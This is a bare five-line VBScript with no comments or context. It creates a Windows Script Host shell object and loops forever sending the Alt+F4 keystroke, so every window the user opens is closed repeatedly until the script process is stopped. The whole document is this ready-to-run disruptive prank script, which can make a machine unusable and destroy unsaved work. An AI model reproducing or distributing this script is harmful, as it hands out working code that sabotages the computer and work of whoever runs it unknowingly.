dim WSHshell 
set WSHshell = wscript.createobject("wscript.shell") 
while(1) 
WSHshell.SendKeys "%{F4}" 
loop 